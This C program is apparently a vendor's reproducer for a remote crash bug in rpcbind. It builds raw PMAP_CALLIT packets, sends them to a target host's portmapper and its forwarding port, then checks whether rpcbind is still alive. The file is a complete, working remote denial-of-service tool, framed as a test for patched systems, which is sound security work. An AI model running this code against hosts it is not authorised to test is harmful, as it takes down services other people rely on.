/*
 * Reproducer for the PMAP_CALLIT remote crash
 *
 * Copyright (C) 2015 Olaf Kirch <okir@suse.de>
 */

#include <stdlib.h>
#include <stdio.h>
#include <rpc/rpc.h>
#include <rpc/pmap_prot.h>
#include <rpc/pmap_clnt.h>
#include <errno.h>
#include <netdb.h>
#include <poll.h>
#include <time.h>
#include <unistd.h>

#include "square.h"

#define TIMEOUT		5
#define PROGNUM		SQUARE_PROG
#define VERSNUM		SQUARE_VERS
#define PROCNUM		SQUAREPROC


static struct sockaddr_in	rpcbind_addr;
static socklen_t		rpcbind_addrlen;


static int			rpcbind_ping(void);

static int
build_callit_message(void *buffer, size_t size)
{
	uint32_t raw_msg[64];
	unsigned int len = 0;

	raw_msg[len++] = 0;		/* XID */
	raw_msg[len++] = 0;		/* CALL */
	raw_msg[len++] = htonl(2);	/* rpcvers */

	raw_msg[len++] = htonl(PMAPPROG);
	raw_msg[len++] = htonl(PMAPVERS);
	raw_msg[len++] = htonl(PMAPPROC_CALLIT);

	/* NULL auth */
	raw_msg[len++] = 0;
	raw_msg[len++] = 0;

	/* NULL verf */
	raw_msg[len++] = 0;
	raw_msg[len++] = 0;

	/* Callit args */

	raw_msg[len++] = htonl(PROGNUM);
	raw_msg[len++] = htonl(VERSNUM);
	raw_msg[len++] = htonl(PROCNUM);
	raw_msg[len++] = htonl(4);

	/* argument */
	raw_msg[len++] = htonl(0xc01dc0fe);

	len *= 4;
	if (len > size)
		return -1;

	memcpy(buffer, raw_msg, len);
	return len;
}

static int
build_ping_message(void *buffer, size_t size)
{
	uint32_t raw_msg[64];
	unsigned int len = 0;

	raw_msg[len++] = 0;		/* XID */
	raw_msg[len++] = 0;		/* CALL */
	raw_msg[len++] = htonl(2);	/* rpcvers */

	raw_msg[len++] = htonl(PMAPPROG);
	raw_msg[len++] = htonl(PMAPVERS);
	raw_msg[len++] = 0;

	/* NULL auth */
	raw_msg[len++] = 0;
	raw_msg[len++] = 0;

	/* NULL verf */
	raw_msg[len++] = 0;
	raw_msg[len++] = 0;

	len *= 4;
	if (len > size)
		return -1;

	memcpy(buffer, raw_msg, len);
	return len;
}

void
update_xid(void *buffer)
{
	static uint32_t xid = 0;
	uint32_t value;

	if (xid == 0)
		xid = getpid() * time(NULL);

	value = htonl(xid++);
	memcpy(buffer, &value, 4);
}

static int
rpcbind_set_host(const char *hostname)
{
	struct hostent *hp = NULL;

	if ((hp = gethostbyname(hostname)) == NULL) {
		fprintf(stderr, "gethostbyname(%s) failed\n", hostname);
		return 0;
	}
	if (hp->h_addrtype != AF_INET) {
		fprintf(stderr, "%s: unexpected address type %d\n", hostname, hp->h_addrtype);
		return 0;
	}

	memset(&rpcbind_addr, 0, sizeof(rpcbind_addr));
	rpcbind_addr.sin_family = AF_INET;
	rpcbind_addr.sin_addr.s_addr = *(uint32_t *) hp->h_addr;
	rpcbind_addr.sin_port = htons(111);
	rpcbind_addrlen = sizeof(rpcbind_addr);

	return rpcbind_addrlen;
}

static int
rpcbind_socket(void)
{
	static int my_udpsock = -1;

	if (my_udpsock >= 0)
		return my_udpsock;

	if ((my_udpsock = socket(PF_INET, SOCK_DGRAM, 0)) < 0) {
		perror("unable to create socket");
		return -1;
	}

	return my_udpsock;
}

static int
__rpcbind_send(const void *buffer, size_t len, const struct sockaddr *addr, socklen_t alen)
{
	int fd;

	printf("Sending... ");

	if ((fd = rpcbind_socket()) < 0)
		return 0;
	if (sendto(fd, buffer, len, 0, addr, alen) < 0) {
		perror("sendto failed");
		return 0;
	}

	return 1;
}

static int
rpcbind_send(const void *buffer, size_t len)
{
	rpcbind_addr.sin_port = htons(111);
	return __rpcbind_send(buffer, len, (struct sockaddr *) &rpcbind_addr, rpcbind_addrlen);
}

static int
rpcbind_recv(struct sockaddr *addr, socklen_t *alen, int timeout)
{
	char rpl_buf[1024];
	int fd;

	printf("receicing reply...");

	if ((fd = rpcbind_socket()) < 0)
		return 0;

	if (timeout >= 0) {
		struct pollfd pfd;

		pfd.fd = fd;
		pfd.events = POLLIN | POLLERR;
		switch (poll(&pfd, 1, timeout * 1000)) {
		case 0:
			fprintf(stderr, "Timed out waiting for reply\n");
			return 0;
		case -1:
			perror("poll failed");
			return 0;
		}
	}

	if (recvfrom(fd, rpl_buf, sizeof(rpl_buf), MSG_DONTWAIT, addr, alen) < 0) {
		perror("recvfrom failed");
		return 0;
	}

	return 1;
}

static int
rpcbind_callit_exploit()
{
	struct sockaddr_in fwd_addr;
	socklen_t alen = sizeof(fwd_addr);
	char msg_buf[1024];
	int msg_len;

	printf("=== First CALLIT message ===\n");

	/* Build a CALLIT message and send it via portmapper */
	msg_len = build_callit_message(msg_buf, sizeof(msg_buf));
	if (msg_len < 0) {
		fprintf(stderr, "Failed to build message\n");
		return 0;
	}

	update_xid(msg_buf);
	if (!rpcbind_send(msg_buf, msg_len)) {
		perror("sendto failed");
		return 0;
	}

	if (rpcbind_recv((struct sockaddr *) &fwd_addr, &alen, TIMEOUT) <= 0) {
		fprintf(stderr, "Unable to receive reply to first CALLIT message\n");
		return 0;
	}

	printf("Success!\n");
	printf("rpcbind's forwarding port is %u\n", ntohs(fwd_addr.sin_port));

	if (!rpcbind_ping())
		return 0;

	/* Now we send *another* packet; this time to the forwarding port.
	 * That is a proper transport, registered via xprt_register and all
	 * that, and hence we end up calling SVC_RECV on it. */
	printf("=== Second CALLIT message ===\n");
	update_xid(msg_buf);

	if (!__rpcbind_send(msg_buf, msg_len, (struct sockaddr *) &fwd_addr, alen)) {
		perror("sendto failed");
		return 0;
	}

	printf("Done.\n");
	return 1;
}

static int
rpcbind_ping(void)
{
	char msg_buf[1024];
	int msg_len;

	printf("=== Pinging rpcbind ===\n");
	msg_len = build_ping_message(msg_buf, sizeof(msg_buf));
	update_xid(msg_buf);

	if (!rpcbind_send(msg_buf, msg_len)) {
		perror("sendto failed");
		return 0;
	}

	if (rpcbind_recv(NULL, 0, TIMEOUT) <= 0) {
		fprintf(stderr, "Unable to receive reply to ping message\n");
		return 0;
	}

	printf("Success!\n");
	printf("Server rpcbind alive and kicking\n");
	return 1;
}

int main(int argc, char *argv[])
{
	uint32_t port;

	setvbuf(stdout, NULL, _IONBF, 0);

	if (argc != 2) {
		fprintf(stderr, "Usage: %s <hostname>\n", argv[0]);
		return 1;
	}

	if (!rpcbind_set_host(argv[1]))
		return 1;

	port = pmap_getport(&rpcbind_addr, PROGNUM, VERSNUM, IPPROTO_UDP);
	if (port == 0) {
		fprintf(stderr, "Cannot get registered port for program %d\n", PROGNUM);
		return 1;
	}

	printf("server port is %u\n", port);

	if (!rpcbind_callit_exploit())
		return 1;

	printf("Sleep for 1 second\n");
	sleep(1);

	if (!rpcbind_ping()) {
		fprintf(stderr, "Oh no. It seems we killed rpcbind\n");
		return 1;
	}

	printf("Congratulations. Looks like your rpcbind survived.\n");
	return 0;
}
